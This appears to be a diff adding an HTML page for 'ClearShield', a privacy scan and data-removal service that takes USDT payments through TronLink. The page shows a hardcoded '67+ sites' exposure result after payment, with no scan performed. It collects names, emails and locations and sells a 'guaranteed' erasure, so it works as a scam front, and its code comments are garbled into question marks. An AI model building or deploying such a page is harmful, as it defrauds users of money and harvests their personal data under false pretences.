@@ -1,1 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ClearShield – Protect Your Digital Identity</title>
+  <style>
+    body { margin: 0; font-family: Arial, sans-serif; background: #0d0d0d; color: #fff; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; }
+    .container { max-width: 420px; width: 100%; text-align: center; }
+    h1 { font-size: 28px; margin-bottom: 10px; font-weight: 700; }
+    p { font-size: 16px; line-height: 1.6; opacity: 0.85; }
+    .card { background: #161616; padding: 25px; margin-top: 25px; border-radius: 12px; box-shadow: 0 0 25px rgba(255, 255, 255, 0.08); }
+    button { background: #f4c24d; color: #000; border: none; padding: 15px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; }
+    button:hover { background: #ffd86a; }
+    #success { display: none; margin-top: 20px; }
+    input { width: 100%; padding: 12px; margin-top: 12px; border-radius: 6px; border: none; box-sizing: border-box; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>ClearShield</h1>
+    <p>Scan your digital exposure across 100+ data brokers and remove your info permanently.</p>
+    <div class="card">
+      <p>Full privacy scan – instant results</p>
+      <button onclick="payForScan()">Start Scan – 9 USDT (TRC20)</button>
+    </div>
 
+    <div id="success" class="card">
+      <p>Payment confirmed! Your scan is ready.</p>
+      <p>We found you in <strong>67+ sites</strong>. Full report sent to email.</p>
+      
+      <h3>Submit Info for Manual Removal</h3>
+      <form id="infoForm">
+        <input type="text" name="name" placeholder="Full Name" required />
+        <input type="email" name="email" placeholder="Email (for report)" required />
+        <input type="text" name="city" placeholder="City / Country" required />
+        <button type="submit">Submit Info</button>
+      </form>
+      
+      <button onclick="payForErase()" style="background:#d32f2f; margin-top:20px;">
+        Erase All My Data – 29 USDT (Guaranteed)
+      </button>
+    </div>
+  </div>
+
+  <script>
+    let walletAddress = "";
+
+    // ???? ???? ?? ?? ???? ???????? (???)
+    fetch('/config').then(r => r.json()).then(data => {
+      walletAddress = data.wallet;
+    });
+
+    async function pay(amount, type) {
+      if (!window.tronLink) return alert("Please install TronLink wallet!");
+      if (!window.tronLink.ready) return alert("Please unlock TronLink!");
+
+      const tronWeb = window.tronLink.tronWeb;
+      const usdtContract = "TR7NHqjeKQxGTCuuQdCA3f2Y2Y8pSQVr7i";
+
+      try {
+        const contract = await tronWeb.contract().at(usdtContract);
+        const tx = await contract.transfer(walletAddress, amount * 1000000).send({
+          feeLimit: 1000000
+        });
+
+        // ????? ?? ????
+        const verify = await fetch('/verify-payment', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ txID: tx, type })
+        }).then(r => r.json());
+
+        if (verify.success) {
+          if (type === 'scan') {
+            document.getElementById('success').style.display = 'block';
+          } else {
+            alert('Erasure request started! You will receive confirmation in 7-14 days.');
+          }
+        } else {
+          alert('Payment not confirmed yet. Please wait 30 seconds and refresh.');
+        }
+      } catch (err) {
+        alert('Transaction failed: ' + err.message);
+      }
+    }
+
+    function payForScan() { pay(9, 'scan'); }
+    function payForErase() { pay(29, 'erase'); }
+
+    document.getElementById('infoForm').onsubmit = async (e) => {
+      e.preventDefault();
+      const data = new FormData(e.target);
+      await fetch('/submit-info', { method: 'POST', body: data });
+      alert('Information submitted. We\'ll start removal process.');
+    };
+  </script>
+</body>
+</html>
